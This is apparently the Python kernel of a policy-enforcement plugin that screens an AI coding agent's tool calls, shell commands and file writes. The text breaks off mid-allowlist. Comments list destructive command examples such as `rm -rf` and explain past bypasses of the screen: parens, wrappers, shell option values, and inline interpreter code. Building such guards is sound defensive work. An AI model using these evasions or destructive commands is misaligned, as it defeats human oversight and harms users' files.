"""taskplane-lite — the enforcement kernel, stdlib only.

A dependency-free port of the parts of taskplane that a Claude or Codex plugin
can enforce *mechanically* on the host agent:

  * tool allowlist               (contract.allowed_tools)
  * filesystem scope boundaries  (coding.scope_paths / out_of_scope_paths)
  * shell command deny patterns  (coding.command_policy.deny)
  * shell write-target screening (redirects + tee/cp/mv/dd/sed -i/…)
  * Definition-of-Done gate       (git scope diff + a test command)

What a host plugin CANNOT do (the honest limitation): intercept the host
agent's model calls, so the dollar/token budget is tracked cooperatively,
not enforced before spend. The PreToolUse hook screens a *cooperative* shell
for build contracts: it makes wrappers (env/nohup/sudo/xargs/…) and nested
`sh -c`/`$()` transparent, and blocks resolvable out-of-scope writes plus
clearly destructive unscopeable verbs (`find -delete/-exec`,
`git checkout/reset/…`). A read-only review never authorizes a shell command:
an allow/deny hook cannot rewrite a host command into shell=False execution,
scrub its process environment, or bind the bytes of the eventual executable.
It admits only explicitly listed host-native Read/Grep/Glob calls and scoped
host-native edits to review artifacts. A future host-owned direct-exec broker
may add command access; caller-authored argv/receipt fields do not. Under a
*build* contract, `python -c "…"` can still write anywhere because a
Turing-complete body cannot be screened from argv. For a hard build boundary,
use a container or OS sandbox.

Behavior mirrors the audited taskplane hooks/DoD logic so a governed task
behaves consistently across supported hosts.

Concurrency guarantee (v2.3.0, honest version): every cross-process
serialization in this kernel goes through ``file_lock`` — advisory
``fcntl.flock`` where the platform provides it, an atomic-mkdir spin lock
with staleness recovery where it does not (Windows, some FUSE/network
mounts), and a raised ``StateError`` when neither can be acquired. It is
NEVER silently lock-free: on a host without flock the fallback still
serializes, and an unacquirable lock fails the operation closed instead of
proceeding unprotected. (Earlier releases wrapped ``import fcntl`` in a
bare try/except and ran lock-free on Windows while the README advertised
Windows support — that gap is closed at this one seam.)
"""

from __future__ import annotations

import fnmatch
import ast
import base64
import hashlib
import hmac
import json
import os
import posixpath
import re
import secrets
import shlex
import stat
import subprocess
import sys
import time as _time
import contextlib as _contextlib

try:
    from .audit_projection import (
        _audit_minimized, _audit_pseudonym, _sanitize_audit_key,
        _sanitize_audit_value, audit_record,
    )
except (ImportError, ValueError):  # direct ``taskplane_lite`` import
    from audit_projection import (
        _audit_minimized, _audit_pseudonym, _sanitize_audit_key,
        _sanitize_audit_value, audit_record,
    )


# ---------------------------------------------------------------------------
# Durable-state primitives (v2.3.0). Governance files that more than one
# process can touch (graph.json, mode.json, tracks.json, meter.json, the
# requirements index, loop.json …) go through these three, so a torn write
# can never destroy state and concurrency never silently degrades.
# ---------------------------------------------------------------------------

class StateError(RuntimeError):
    """A governance state file is unreadable or unprotectable.

    Raised instead of a bare traceback (fail-closed WITH a remedy) — never
    swallowed into a silent default: masking a corrupt control file is how a
    user's `private` flag or a track registry quietly disappears."""

    def __init__(self, path: str, why: str, remedy: str = ""):
        self.path = path
        msg = f"{why}: {path}"
        if remedy:
            msg += f" — {remedy}"
        super().__init__(msg)


def atomic_write_json(path: str, data, *, indent: int = 1,
                      sort_keys: bool = False) -> None:
    """Write JSON durably: fsynced temp + replace + parent-directory fsync.

    A crash mid-write leaves the previous version intact instead of a torn
    file. Same-directory temp keeps the replace atomic across filesystems."""
    d = os.path.dirname(path) or "."
    _durable_makedirs(d)
    tmp = os.path.join(
        d, f".{os.path.basename(path)}.tmp.{os.getpid()}."
        f"{secrets.token_hex(8)}")
    try:
        # newline="" disables the host's newline translation. Windows
        # text mode turns every "\n" json.dump writes into "\r\n", so the
        # SAME state written on two hosts produced different BYTES — and
        # these artifacts are fingerprinted and byte-compared (the audit
        # differential caught it: b'{\r\n  "reviews": 6\r\n}').
        with open(tmp, "x", encoding="utf-8", newline="") as f:
            json.dump(data, f, indent=indent, sort_keys=sort_keys)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, path)
        _fsync_directory(d)
    finally:
        try:
            if os.path.exists(tmp):
                os.unlink(tmp)
        except OSError:
            pass


def atomic_write_bytes(path: str, data: bytes) -> None:
    """Durably replace one file with exact caller-owned bytes.

    This is the byte-preserving counterpart of :func:`atomic_write_json` for
    recovery paths that must restore the exact prior artifact representation,
    rather than merely an equivalent decoded JSON value.
    """
    if not isinstance(data, bytes):
        raise TypeError("atomic_write_bytes requires bytes")
    directory = os.path.dirname(path) or "."
    _durable_makedirs(directory)
    temporary = os.path.join(
        directory, f".{os.path.basename(path)}.tmp.{os.getpid()}."
        f"{secrets.token_hex(8)}")
    try:
        with open(temporary, "xb") as stream:
            stream.write(data)
            stream.flush()
            os.fsync(stream.fileno())
        os.replace(temporary, path)
        _fsync_directory(directory)
    finally:
        try:
            if os.path.exists(temporary):
                os.unlink(temporary)
        except OSError:
            pass


def _durable_makedirs(path: str) -> None:
    """Create a directory chain without acknowledging volatile ancestors.

    ``os.makedirs`` makes the complete chain but provides no point at which a
    caller can persist each newly linked directory.  Governance state may be
    the first write beneath a fresh run/store hierarchy, so create each
    missing component separately.  The child is flushed first, then the
    parent that owns its name.  Any failure propagates before the state file
    is opened; a partially created (but unacknowledged) empty chain is safe to
    retry.
    """
    target = os.path.abspath(path)
    missing = []
    cursor = target
    while not os.path.lexists(cursor):
        missing.append(cursor)
        parent = os.path.dirname(cursor)
        if parent == cursor:
            break
        cursor = parent
    _durable_directory_identity(cursor)

    for directory in reversed(missing):
        parent = os.path.dirname(directory) or "."
        try:
            os.mkdir(directory)
        except FileExistsError:
            # Treat a concurrent creator exactly like our own mkdir: verify
            # its object type and establish durability ourselves before
            # descending.  Never assume another process completed its fsync.
            pass
        identity = _durable_directory_identity(directory)
        _fsync_directory(directory)
        _fsync_directory(parent)
        if _durable_directory_identity(directory) != identity:
            raise StateError(directory,
                             "durable directory identity changed during fsync")


def _durable_directory_identity(path: str) -> tuple[int, int]:
    """Return a stable non-symlink directory identity or fail closed."""
    try:
        value = os.lstat(path)
    except OSError as exc:
        raise StateError(path, f"durable directory is unavailable ({exc})") \
            from None
    if stat.S_ISLNK(value.st_mode):
        raise StateError(path, "durable directory anchor is a symlink")
    if not stat.S_ISDIR(value.st_mode):
        raise StateError(path, "durable directory anchor is not a directory")
    return int(value.st_dev), int(value.st_ino)


def _flush_windows_directory(path: str) -> None:
    """Flush one directory through the native backup-semantics handle."""
    import ctypes
    kernel = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel.CreateFileW.restype = ctypes.c_void_p
    kernel.CreateFileW.argtypes = (
        ctypes.c_wchar_p, ctypes.c_uint32, ctypes.c_uint32,
        ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p)
    kernel.FlushFileBuffers.argtypes = (ctypes.c_void_p,)
    kernel.CloseHandle.argtypes = (ctypes.c_void_p,)
    handle = kernel.CreateFileW(
        str(path), 0x80000000, 0x00000007, None, 3, 0x02000000, None)
    invalid = ctypes.c_void_p(-1).value
    if handle == invalid:
        raise ctypes.WinError(ctypes.get_last_error())
    try:
        if not kernel.FlushFileBuffers(handle):
            error = ctypes.get_last_error()
            if error != 5:  # ERROR_ACCESS_DENIED
                raise ctypes.WinError(error)
            # Windows accepts a backup-semantics directory handle but does
            # not support FlushFileBuffers for directories. The preceding
            # file fsync and atomic replace remain authoritative; only this
            # unavailable directory-metadata flush is acknowledged here.
    finally:
        if not kernel.CloseHandle(handle):
            raise ctypes.WinError(ctypes.get_last_error())


def _fsync_directory(path: str) -> None:
    """Persist a directory entry update before its caller acknowledges it."""
    flags = (os.O_RDONLY | getattr(os, "O_DIRECTORY", 0)
             | getattr(os, "O_NOFOLLOW", 0))
    try:
        fd = os.open(path, flags)
    except OSError:
        if os.name != "nt":
            raise
        # Windows may refuse opening directories through os.open.
        _flush_windows_directory(path)
        return
    try:
        try:
            os.fsync(fd)
        except PermissionError:
            if os.name != "nt":
                raise
            # CPython can open the directory descriptor on Windows while the
            # CRT still rejects fsync on it. FlushFileBuffers is the durable
            # native fallback; the error remains fatal if that flush fails.
            _flush_windows_directory(path)
    finally:
        os.close(fd)


_LOAD_RAISE = object()


def load_json(path: str, default=_LOAD_RAISE, *, what: str = "state file"):
    """Read a JSON governance file with a strict corruption contract.

    Missing file  -> `default` when given, else StateError (fail closed).
    Corrupt file  -> ALWAYS StateError naming the path and a remedy — a
                     corrupt control file must never be silently replaced by
                     a default (that is fail-open data loss)."""
    try:
        with open(path, encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        if default is not _LOAD_RAISE:
            return default
        raise StateError(path, f"missing {what}",
                         "re-run the command that creates it") from None
    except ValueError as e:
        raise StateError(
            path, f"corrupt {what} ({e})",
            "inspect/restore it (git checkout or delete after review); "
            "taskplane will not guess its contents") from None
    except OSError as e:
        raise StateError(path, f"unreadable {what} ({e})") from None


_LOCK_STALE_S = 120.0


@_contextlib.contextmanager
def file_lock(path: str, *, timeout: float = 10.0):
    """Advisory exclusive lock on <path>.lock — NEVER silently lock-free.

    Primary: fcntl.flock. Where flock is unavailable or refused (Windows,
    some FUSE/network mounts — exactly the hosts this plugin targets), fall
    back to an atomic mkdir spin-lock with staleness recovery instead of
    proceeding unlocked. If even that cannot be acquired within `timeout`,
    raise StateError: failing closed beats corrupting shared state."""
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    lock_path = path + ".lock"
    # ACQUISITION failures fall through to the mkdir lock; an exception
    # raised by the CALLER'S BODY must propagate unchanged (v2.3.0 — the
    # earlier shape caught the body's OSError too, then yielded a second
    # time from the fallback path).
    lf = None
    try:
        lf = open(lock_path, "w", encoding="utf-8", newline="")
        import fcntl
        fcntl.flock(lf, fcntl.LOCK_EX)
    except (ImportError, OSError):
        if lf is not None:
            lf.close()
        lf = None     # fall through to the mkdir lock — not to "no lock"
    if lf is not None:
        try:
            yield
        finally:
            lf.close()
        return
    lockdir = path + ".lockdir"
    deadline = _time.monotonic() + max(0.1, timeout)
    while True:
        try:
            os.mkdir(lockdir)
            break
        except FileExistsError:
            try:  # steal a lock left behind by a dead process
                if _time.time() - os.stat(lockdir).st_mtime > _LOCK_STALE_S:
                    os.rmdir(lockdir)
                    continue
            except OSError:
                pass
            if _time.monotonic() >= deadline:
                raise StateError(
                    lockdir, "could not acquire state lock",
                    "another process holds it; if it is dead, remove the "
                    "lockdir") from None
            _time.sleep(0.05)
        except OSError as e:
            raise StateError(lockdir, f"lock unavailable ({e})") from None
    try:
        yield
    finally:
        try:
            os.rmdir(lockdir)
        except OSError:
            pass

# Host write tools → the input key that carries the path. Codex sends
# apply_patch with the patch body in ``command``; its targets are extracted
# separately because one call may edit several files.
WRITE_TOOL_PATH_FIELDS = {
    "Write": ("file_path", "path"),
    "Edit": ("file_path", "path"),
    "MultiEdit": ("file_path", "path"),
    "NotebookEdit": ("notebook_path", "file_path", "path"),
    "str_replace": ("file_path", "path"),
    "apply_patch": (),
}
WRITE_TOOLS = set(WRITE_TOOL_PATH_FIELDS)
COMMAND_TOOLS = {"Bash", "BashOutput", "exec_command",
                 "functions.exec_command"}
READONLY_NATIVE_READ_TOOLS = frozenset({"Read", "Grep", "Glob"})
TOOL_ALIASES = {
    "apply_patch": ("apply_patch", "Edit", "Write"),
    "Agent": ("Agent", "Task"),
    "exec_command": ("exec_command", "Bash"),
    "functions.exec_command": ("functions.exec_command", "exec_command",
                               "Bash"),
}
_PATCH_TARGET_RE = re.compile(
    r"^\*\*\* (?:(?:Add|Update|Delete) File|Move to):\s*"
    r"(?P<path>.+?)\s*$",
    re.MULTILINE,
)

# D-0001: grouping constructs hide the program token. `(rm -rf x)`
# tokenized to `(rm`, which is in no write-program table and no deny
# head, so ONE PAREN defeated every screen — read-only contracts
# included — and `(git push)` walked through DEFAULT_DENY.
#
# Stripped at the TOKEN level, not by adding ()/{} to this regex: a
# paren inside a quoted argument is not a separator, and splitting on
# it shredded `python3 -c "open(1)"` into three fragments — which the
# eval-body screening test caught immediately. shlex already knows
# which parens are quoted; the regex does not.
_CMD_SEP_RE = re.compile(r"[;&|\n]+")
# Shell KEYWORDS that precede a real command: `if true; then rm -rf x; fi`
# splits on `;`, but the segment is `then rm -rf x` and prog becomes
# `then`. Stripped in BOTH screeners before the program is identified.
_SHELL_KEYWORDS = frozenset({
    "if", "then", "else", "elif", "fi", "while", "until", "do", "done",
    "for", "case", "esac", "select", "function", "time", "!",
})
_SHELL_VALUE_FLAGS = frozenset({"-o", "+o", "--rcfile", "--init-file"})


def _strip_keywords(toks) -> list:
    """Drop leading shell syntax so the PROGRAM is identified.

    Two shapes, both of which hid the program (D-0001):
      `(rm -rf x)`          shlex glues the paren: token `(rm`
      `if true; then rm x`  `;` splits, leaving keyword `then` first

    Trailing grouping characters are stripped ONLY when the segment
    opened with one, so a legitimate `open(1)` argument is untouched.
    """
    toks = list(toks or [])
    opened = False
    while toks:
        first = toks[0]
        if first and all(ch in "({" for ch in first):
            toks = toks[1:]                  # a bare `(` or `{` token
            opened = True
            continue
        stripped = first.lstrip("({")
        if stripped != first:
            opened = True
            if not stripped:
                toks = toks[1:]
                continue
            toks = [stripped] + toks[1:]
            continue
        # Shell keywords are exact grammar tokens.  Basenaming here let a
        # repository executable such as ``./time`` or ``./if`` disappear as
        # syntax before executable identity was checked.
        if first in _SHELL_KEYWORDS:
            toks = toks[1:]
            continue
        break
    if opened and toks:
        tail = toks[-1].rstrip(")}")
        toks = toks[:-1] + ([tail] if tail else [])
    return toks


def _shell_c_body(args) -> "str | None":
    """The command string a shell will RUN, from its argv.

    Walks the options rather than grabbing the first non-dash token: a
    value-taking option's value is not the body. `bash -o errexit -c
    'rm -rf src/main.py'` returned "errexit" and the real command was
    never analysed at all (D-0004).
    """
    i = 0
    while i < len(args):
        a = args[i]
        if a in _SHELL_VALUE_FLAGS:
            i += 2                              # skip flag AND value
            continue
        if a.startswith("-") and a != "-":
            if a == "-c":
                return args[i + 1] if i + 1 < len(args) else None
            if not a.startswith("--") and "c" in a[1:]:
                for b in args[i + 1:]:
                    if not b.startswith("-"):
                        return b
                return None
            i += 1
            continue
        return a                                # bare positional
    return None
# a redirect operator token after shlex tokenization: >, >>, 2>, &>, >| …
_REDIRECT_OP_RE = re.compile(r"^(?:\d*>>?|>\||&>>?|\d*>&\d*)$")
# a redirect written glued to its target: >file, 2>>log (no space)
_REDIRECT_GLUED_RE = re.compile(r"^(?:\d*>>?|>\|)(?P<f>[^>&].*)$")
# bash ANSI-C quoting: $'…' with backslash escapes decoded by the shell
_ANSI_C_RE = re.compile(r"\$'((?:\\.|[^'\\])*)'")


def _backtick_body(text: str, opening: int):
    """Return an old-style command-substitution body and closing index.

    Backticks are a delimiter grammar, not a regular expression: an escaped
    backtick is data, while the next unescaped one closes the substitution.
    Keeping this tiny parser separate also lets the balanced ``$(...)``
    scanner skip a backtick body whose text contains otherwise-significant
    parentheses.
    """
    i = opening + 1
    while i < len(text):
        if text[i] == "\\":
            i += 2
            continue
        if text[i] == "`":
            return text[opening + 1:i], i, None
        i += 1
    return "", len(text), "unclosed backtick command substitution"


def _balanced_shell_parens(text: str, opening: int):
    """Return the body/end of one shell ``(...)`` construct.

    This is intentionally a conservative structural scanner, not a shell
    interpreter.  It balances grouping parentheses, ignores quoted/escaped
    parentheses, and recursively skips nested command/process substitutions.
    Anything it cannot close is reported as opaque instead of being treated
    as an absence of executable content.
    """
    depth = 1
    quote = None
    i = opening + 1
    while i < len(text):
        ch = text[i]
        if quote == "'":
            if ch == "'":
                quote = None
            i += 1
            continue
        if ch == "\\":
            i += 2
            continue
        if quote == '"':
            if ch == '"':
                quote = None
                i += 1
                continue
            if ch == "`":
                _, end, error = _backtick_body(text, i)
                if error:
                    return "", len(text), error
                i = end + 1
                continue
            if ch == "$" and i + 1 < len(text) and text[i + 1] == "(":
                _, end, error = _balanced_shell_parens(text, i + 1)
                if error:
                    return "", len(text), error
                i = end + 1
                continue
            i += 1
            continue
        if ch == "'":
            quote = "'"
            i += 1
            continue
        if ch == '"':
            quote = '"'
            i += 1
            continue
        if ch == "`":
            _, end, error = _backtick_body(text, i)
            if error:
                return "", len(text), error
            i = end + 1
            continue
        if ((ch == "$" and i + 1 < len(text) and text[i + 1] == "(")
                or (ch in "<>" and i + 1 < len(text)
                    and text[i + 1] == "(")):
            _, end, error = _balanced_shell_parens(text, i + 1)
            if error:
                return "", len(text), error
            i = end + 1
            continue
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0:
                return text[opening + 1:i], i, None
        i += 1
    return "", len(text), "unclosed parenthesized shell substitution"


def _shell_substitution_bodies(command: str):
    """Return executable substitution bodies plus a structural error.

    Single quotes and escaped introducers are literal.  ``$(...)``, old-style
    backticks, and bash/zsh process substitutions are executable and are
    returned for recursive screening.  Arithmetic substitution is refused as
    opaque: proving its expansion semantics safely would require a real shell
    grammar, and nested expansions can execute commands.
    """
    text = str(command or "")
    bodies = []
    quote = None
    i = 0
    while i < len(text):
        ch = text[i]
        if quote == "'":
            if ch == "'":
                quote = None
            i += 1
            continue
        if ch == "\\":
            i += 2
            continue
        if ch == "'" and quote is None:
            quote = "'"
            i += 1
            continue
        if ch == '"':
            quote = None if quote == '"' else '"'
            i += 1
            continue
        if ch == "`":
            body, end, error = _backtick_body(text, i)
            if error:
                return bodies, error
            bodies.append(("command", body))
            i = end + 1
            continue
        if ch == "$" and i + 1 < len(text) and text[i + 1] == "(":
            arithmetic = i + 2 < len(text) and text[i + 2] == "("
            body, end, error = _balanced_shell_parens(text, i + 1)
            if error:
                return bodies, error
            if arithmetic:
                return bodies, (
                    "arithmetic shell substitution cannot be proven free "
                    "of nested executable expansion")
            bodies.append(("command", body))
            i = end + 1
            continue
        if quote is None and ch in "<>" and i + 1 < len(text) \
                and text[i + 1] == "(":
            body, end, error = _balanced_shell_parens(text, i + 1)
            if error:
                return bodies, error
            bodies.append(("process", body))
            i = end + 1
            continue
        i += 1
    if quote is not None:
        return bodies, "unclosed shell quote prevents substitution screening"
    return bodies, None


def _ansi_c_unquote(s: str) -> str:
    """Decode bash ANSI-C quoted segments ($'rm \\x2drf x' → 'rm -rf x') into
    plain shell-quoted text, so tokenization sees the command the shell would
    actually run."""
    def _sub(m):
        body = m.group(1)
        try:
            body = body.encode().decode("unicode_escape")
        except (UnicodeDecodeError, ValueError):
            pass
        return shlex.quote(body)
    return _ANSI_C_RE.sub(_sub, s)

# Wrapper programs that exec a trailing command — screen what they RUN, not
# the wrapper itself. `env FOO=1 rm x`, `nohup rm x`, `time rm x`,
# `sudo rm x` all mutate `x`; making them transparent closes the
# "prefix-a-wrapper" bypass of the write screen.
_WRAPPERS = {"env", "nohup", "time", "sudo", "doas", "nice", "ionice",
             "setsid", "stdbuf", "timeout", "chrt", "eatmydata",
             # shell builtins that exec their trailing argv — `command git
             # push` / `exec rm x` must screen the real program (v2.3.0)
             "command", "exec", "builtin"}
_SHELLS = {"sh", "bash", "dash", "zsh", "ksh"}
# Interpreters whose inline-code flag hides arbitrary file writes from argv.
# awk/ed/ex are interpreters too: `awk 'BEGIN{print>"f"}'` and an `ed`/`ex`
# script write files at a path named INSIDE the program text, not in a
# screenable argv slot (v2.3.1 — closed: a read-only contract used to APPROVE
# `awk 'BEGIN{print>"main.py"}'`). They join the interpreter-opaque class:
# blocked under read-only, allowed-but-opaque under build (same documented gap
# as python -c). TRADEOFF (named, per the tradeoffs lens): this screen is
# defense-in-depth, NOT an OS boundary — console-script entry points
# (pytest, make, tox, npm) run the same Turing-complete code and remain
# blocked by the read-only command allowlist below; a hard guarantee still
# needs a read-only mount/container.
_INTERPRETERS = {"python", "python2", "python3", "perl", "ruby", "node",
                 "php", "lua", "Rscript", "deno", "bun",
                 "awk", "gawk", "mawk", "nawk", "ed", "ex"}
# This package's OWN CLI. A read-only REVIEW contract must still let the review
# persona run `python3 .../taskplane/tp.py findings|dashboard|graph` — the CLI
# is the governed tool itself, not an arbitrary interpreter body, so it is
# exempt from interpreter-opacity (v2.3.1 — the tightening had self-DoS'd the
# review workflow). Matched by resolved path, so a stray file merely named
# tp.py elsewhere is NOT exempt.
_TP_CLI_PATH = os.path.realpath(
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "tp.py"))
# Archive extractors write files at paths named INSIDE the archive, unscopeable
# from argv — like `find -delete`. Extraction modes are destructive-opaque
# (blocked under ANY governing contract); create/list/test modes are not.
_ARCHIVE_EXTRACTORS = {"tar", "unzip"}

# Direct programs whose argv has read-only semantics. Read-only contracts
# fail closed for everything outside this intentionally small set (plus the
# structured cases handled by _analyze: git reads, find reads, non-extracting
# archives, screened writers, and Taskplane's own CLI). In particular, build
# systems, test runners, package managers, and repository-defined executables
# can run arbitrary project code and therefore never qualify by name alone.
_READONLY_SAFE_PROGRAMS = frozenset({
    "[", "basename", "cat", "cmp", "comm", "cut", "date", "diff",
    "dirname", "du", "echo", "egrep", "expr", "false", "fgrep", "file",
    "grep", "head", "jq", "ls", "md5", "md5sum", "od", "printf", "pwd",
    "readlink", "realpath", "rg", "sha256sum", "shasum", "stat", "strings",
    "tail", "test", "tr", "true", "uname", "uniq", "wc", "whereis",
    "which", "xxd", "zipinfo", "tp",
})
_READONLY_SHELL_BUILTINS = frozenset({
    "[", "builtin", "command", "echo", "exec", "false", "printf", "pwd",
    "test", "true",
})


def _path_within(candidate: str, root: str) -> bool:
    """Containment for executable identity checks, fail-closed on errors."""
    try:
        candidate = os.path.normcase(os.path.abspath(candidate))
        root = os.path.normcase(os.path.abspath(root))
        return os.path.commonpath((candidate, root)) == root
    except (OSError, TypeError, ValueError):
        return True


_READONLY_BASELINE_PATH = tuple(os.environ.get("PATH", "").split(os.pathsep))
_READONLY_BASELINE_PATHEXT = os.environ.get("PATHEXT", "")
_READONLY_BASELINE_EXECUTABLES: dict[
    tuple[str, str], tuple[str, str] | None] = {}
_READONLY_IMMUTABLE_EXEC_ROOTS = tuple(dict.fromkeys(
    candidate
    for path in (
        "/bin", "/usr/bin", "/usr/sbin", "/sbin",
        "/System/Cryptexes/App/usr/bin",
        "/Library/Apple/usr/bin",
    ) if os.path.isdir(path)
    for candidate in (os.path.abspath(path), os.path.realpath(path))))
_READONLY_PINNED_TOOL_ROOTS = {
    "git": tuple(os.path.realpath(path) for path in (
        "/usr/local/Cellar", "/opt/homebrew/Cellar",
    ) if os.path.isdir(path)),
    "rg": tuple(os.path.realpath(path) for path in (
        "/Applications/ChatGPT.app/Contents/Resources",
    ) if os.path.isdir(path)),
}


def _executable_from_path(program: str, path_entries, workspace: str):
    """The first executable selected by a concrete PATH snapshot."""
    for raw_entry in path_entries:
        entry = (os.path.abspath(raw_entry) if raw_entry
                 and os.path.isabs(raw_entry)
                 else os.path.abspath(os.path.join(workspace,
                                                   raw_entry or ".")))
        candidate = os.path.join(entry, program)
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return os.path.abspath(candidate), os.path.realpath(candidate)
    return None


def _readonly_write_roots(workspace: str, write_allow) -> tuple[str, ...]:
    """Canonical non-glob prefixes a read-only contract may write beneath."""
    roots = []
    for raw in write_allow or ():
        value = str(raw or "").replace("\\", "/")
        wildcard = min((value.find(ch) for ch in "*?[" if ch in value),
                       default=len(value))
        prefix = value[:wildcard].rstrip("/")
        if not prefix:
            continue
        path = prefix if os.path.isabs(prefix) else os.path.join(workspace,
                                                                  prefix)
        roots.append(os.path.abspath(path))
        roots.append(os.path.realpath(path))
    return tuple(dict.fromkeys(roots))


def _readonly_executable_identity_violation(raw_program: str,
                                             workspace: str | None,
                                             write_allow=()):
    """Why an executable is not the trusted identity selected at hook load.

    A read-only decision binds *every* external executable, including writers,
    interpreters, wrappers, and readers.  Bare-name resolution must still pick
    the same lexical and canonical executable selected by the host's startup
    PATH, and neither path may pass through the reviewed checkout or a writable
    artifact root.  A later PATH edit therefore cannot turn ``cat`` or
    ``touch`` into repository code, even when the replacement is a symlink to
    the genuine tool.  Build contracts do not call this fail-closed grammar.
    """
    token = str(raw_program or "")
    if not token:
        return "empty executable identity can't be screened"
    normalized = token.replace("\\", "/")
    if "/" in normalized:
        return (
            f"path-qualified executable `{token}` cannot be accepted by "
            "basename as a trusted read-only program; use its bare name "
            "under a non-repository-controlled PATH")
    if token in _READONLY_SHELL_BUILTINS:
        return None
    function_markers = (f"BASH_FUNC_{token}%%", f"BASH_FUNC_{token}()")
    if any(marker in os.environ for marker in function_markers):
        return f"shell function precedence for `{token}` is not trusted"
    if any(os.environ.get(name) for name in ("BASH_ENV", "ENV", "ZDOTDIR")):
        return (
            "shell startup environment can define aliases/functions before "
            f"bare executable `{token}`")
    if "expand_aliases" in os.environ.get("SHELLOPTS", "").split(":"):
        return f"shell alias precedence for `{token}` is not trusted"
    if os.name == "nt" and os.environ.get("PATHEXT", "") != \
            _READONLY_BASELINE_PATHEXT:
        return "PATHEXT changed after hook startup, so lookup can't be trusted"

    root = os.path.abspath(workspace or os.getcwd())
    selected = _executable_from_path(
        token, os.environ.get("PATH", "").split(os.pathsep), root)
    if selected is None:
        return f"bare executable `{token}` has no trusted PATH identity"
    candidate, resolved_candidate = selected
    protected = (root, os.path.realpath(root),
                 *_readonly_write_roots(root, write_allow))
    if any(_path_within(candidate, boundary)
           or _path_within(resolved_candidate, boundary)
           for boundary in protected):
        return (
            f"PATH candidate `{candidate}` for bare executable `{token}` "
            "resolves through repository-controlled or review-writable "
            "content")

    baseline_key = (token, root)
    if baseline_key not in _READONLY_BASELINE_EXECUTABLES:
        _READONLY_BASELINE_EXECUTABLES[baseline_key] = _executable_from_path(
            token, _READONLY_BASELINE_PATH, root)
    baseline = _READONLY_BASELINE_EXECUTABLES[baseline_key]
    if baseline is None or selected != baseline:
        expected = baseline[0] if baseline else "<none>"
        return (
            f"PATH candidate `{candidate}` for bare executable `{token}` "
            f"does not match its trusted startup identity `{expected}`")
    trusted_roots = (_READONLY_IMMUTABLE_EXEC_ROOTS
                     + _READONLY_PINNED_TOOL_ROOTS.get(token, ()))
    candidate_is_pinned_tool = bool(
        _READONLY_PINNED_TOOL_ROOTS.get(token)) and selected == baseline
    if not ((candidate_is_pinned_tool
             or any(_path_within(candidate, boundary)
                    for boundary in _READONLY_IMMUTABLE_EXEC_ROOTS))
            and any(_path_within(resolved_candidate, boundary)
                    for boundary in trusted_roots)):
        return (
            f"PATH candidate `{candidate}` for bare executable `{token}` "
            "is not under a canonical immutable system/tool root")
    return None


def _shsplit(text: str) -> list:
    """shlex.split, but a backslash is a PATH SEPARATOR on Windows, not an
    escape.

    Posix-mode shlex silently EATS backslashes, so the screener saw
    `python3 D:\\a\\repo\\taskplane\\tp.py` as the single token
    `D:arepotaskplanetp.py` — every path-shaped screen (the tp.py exemption,
    the deny globs, the scope check) was therefore matching against a
    mangled string on that host. Normalizing first fails toward MORE
    recognition, which is the safe direction for a deny screen.
    """
    if os.name == "nt":
        text = str(text).replace("\\", "/")
    try:
        return shlex.split(text)
    except ValueError:
        return str(text).split()


def _is_tp_cli(arg: str, workspace: str | None = None) -> bool:
    """True only when a script resolves to this package's canonical tp.py."""
    a = str(arg or "").replace("\\", "/")
    if os.path.basename(a) != "tp.py":
        return False
    try:
        candidate = (a if os.path.isabs(a)
                     else os.path.join(workspace or os.getcwd(), a))
        # Do not grant the exemption through a repository-controlled symlink:
        # its target can change between screening and execution.  Both the
        # lexical absolute path and its canonical resolution must be the one
        # package file loaded by this kernel.
        return (os.path.abspath(candidate) == _TP_CLI_PATH
                and os.path.realpath(candidate) == _TP_CLI_PATH
                and not os.path.islink(candidate))
    except OSError:
        return False
# The only interpreter argvs that provably run NO user code (v2.3.0): pure
# version/help probes. Everything else — script file, -m module, stdin —
# is as un-screenable as `-c` and is treated as interpreter-opaque.
_INTERPRETER_SAFE_FLAGS = {"--version", "-V", "--help", "-h"}

# ---- inline python that can be PROVEN read-only (v2.11.0) -------------------
#
# `python3 -c …` was refused outright because "file writes can't be screened
# from argv". True of an opaque string — but a Python string is not opaque,
# it is a grammar, and the reason the blanket denial hurt is that the work it
# blocked was genuinely read-only: a directory walk during a review, and a
# lens agent validating its own findings JSON before writing it. A screen
# that forbids reading teaches agents to route around the screen.
#
# The rule is an ALLOWLIST and it fails closed: the code must parse, and
# every import, call, and attribute in it must appear below. Anything not
# recognised — an unknown module, a dunder, a lambda calling something
# unlisted, a syntax error — is NOT read-only and the existing denial stands.
# `open` is allowed only in a read mode. Nothing here can name `write`,
# `subprocess`, `shutil`, `eval`, or an os mutator, because those are simply
# not in the sets.
_RO_MODULES = frozenset({
    "os", "os.path", "sys", "json", "re", "pathlib", "glob", "fnmatch",
    "collections", "itertools", "functools", "operator", "math", "hashlib",
    "base64", "textwrap", "datetime", "csv", "statistics", "string", "ast",
    "difflib", "typing", "unicodedata", "decimal", "urllib.parse"})
_RO_BUILTINS = frozenset({
    "print", "len", "sorted", "set", "frozenset", "list", "dict", "tuple",
    "str", "int", "float", "bool", "bytes", "sum", "min", "max", "any",
    "all", "enumerate", "zip", "range", "map", "filter", "repr", "abs",
    "round", "reversed", "isinstance", "issubclass", "type", "format",
    "next", "iter", "hash", "ord", "chr", "divmod", "slice", "id"})
# Attribute names an expression may use. Deliberately excludes every writer:
# write, writelines, truncate, mkdir, unlink, remove, rename, rmtree, chmod,
# system, popen, run, Popen, touch, write_text, write_bytes, dump.
_RO_ATTRS = frozenset({
    # os / os.path reads
    "path", "listdir", "walk", "scandir", "getcwd", "getenv", "environ",
    "sep", "curdir", "pardir", "stat", "fspath", "basename", "dirname",
    "join", "splitext", "exists", "isfile", "isdir", "islink", "abspath",
    "realpath", "relpath", "normpath", "getsize", "getmtime", "commonpath",
    # pathlib reads
    "Path", "name", "suffix", "stem", "parent", "parents", "parts", "glob",
    "rglob", "iterdir", "is_file", "is_dir", "read_text", "read_bytes",
    "resolve", "as_posix", "relative_to", "with_suffix",
    # file reads
    "read", "readline", "readlines", "close", "closed", "seek", "tell",
